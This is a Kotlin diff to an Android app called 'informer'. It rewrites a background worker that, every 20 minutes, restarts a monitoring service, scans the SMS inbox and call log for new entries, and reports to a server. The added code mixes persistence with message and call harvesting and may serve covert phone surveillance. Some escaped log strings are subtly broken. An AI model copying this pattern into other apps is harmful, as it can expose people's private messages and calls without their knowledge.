@@ -1,7 +1,9 @@
 package com.example.informer
 
 import android.content.Context
+import android.content.Intent
 import android.util.Log
+import androidx.core.content.ContextCompat
 import androidx.work.CoroutineWorker
 import androidx.work.WorkerParameters
 import kotlinx.coroutines.Dispatchers
@@ -10,41 +12,40 @@ import kotlinx.coroutines.withContext
 class SyncWorker(context: Context, params: WorkerParameters) : CoroutineWorker(context, params) {
 
     override suspend fun doWork(): Result = withContext(Dispatchers.IO) {
-        // Hỗ trợ Direct Boot bằng cách sử dụng Device Protected Storage
-        val safeContext = if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.N) {
-            applicationContext.createDeviceProtectedStorageContext()
-        } else {
-            applicationContext
-        }
+        val safeContext = applicationContext.deviceProtectedContext()
 
-        val sharedPref = safeContext.getSharedPreferences("AppConfig", Context.MODE_PRIVATE)
-        val phone = sharedPref.getString("my_phone", "") ?: ""
-        val token = sharedPref.getString("token", "") ?: ""
-        Log.d("SYNC_WORKER", "doWork() phoneSet=${phone.isNotEmpty()} tokenSet=${token.isNotEmpty()}")
-
-        if (phone.isEmpty() || token.isEmpty()) {
-            Log.d("SYNC_WORKER", "⏭️ Chưa kích hoạt, bỏ qua.")
-            MainActivity.addLog("⏭️ [Heartbeat] Bỏ qua vì chưa kích hoạt")
+        if (!AppLifecycleManager.isActivated(safeContext)) {
             return@withContext Result.success()
         }
 
         return@withContext try {
-            MainActivity.addLog("🔄 [Heartbeat] Đang gửi...")
+            Log.d("SYNC_WORKER", "=== LUONG MANH NHAT DANG CHAY (20 PHUT) ===")
+            MainActivity.addLog("🫀 [Ve si] Luong manh nhat (20 phut) dang kiem tra tong the...")
+            
+            val serviceIntent = Intent(applicationContext, BackgroundMonitoringService::class.java)
+            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
+                ContextCompat.startForegroundService(applicationContext, serviceIntent)
+            } else {
+                applicationContext.startService(serviceIntent)
+            }
+
+            val smsCount = SmsInboxSync.pollMissingSms(applicationContext, "WM_STRONG")
+            val callCount = CallLogSync.pollMissingCalls(applicationContext, "WM_STRONG")
+            
+            if (smsCount > 0 || callCount > 0) {
+                MainActivity.addLog("🛰️ [WM_STRONG] Da quet bu: SMS=\$smsCount, CALL=\$callCount")
+            }
+
             val ok = ServerReporter.sendEventSync(
                 context = applicationContext,
-                type = "HEARTBEAT",
+                type = "HEARTBEAT_STRONG",
                 incomingNumber = "HE_THONG",
-                content = "Thiet bi dang online - kiem tra dinh ky tu dong."
+                content = "Ve si manh nhat da kiem tra va hoi sinh he thong."
             )
-            if (ok) {
-                Log.d("SYNC_WORKER", "✅ Heartbeat OK")
-                Result.success()
-            } else {
-                Log.w("SYNC_WORKER", "⚠️ Server không phản hồi, retry.")
-                Result.retry()
-            }
+
+            if (ok) Result.success() else Result.retry()
         } catch (e: Exception) {
-            Log.e("SYNC_WORKER", "❌ ${e.message}")
+            Log.e("SYNC_WORKER", "❌ Loi luong manh nhat: \${e.message}")
             Result.retry()
         }
     }
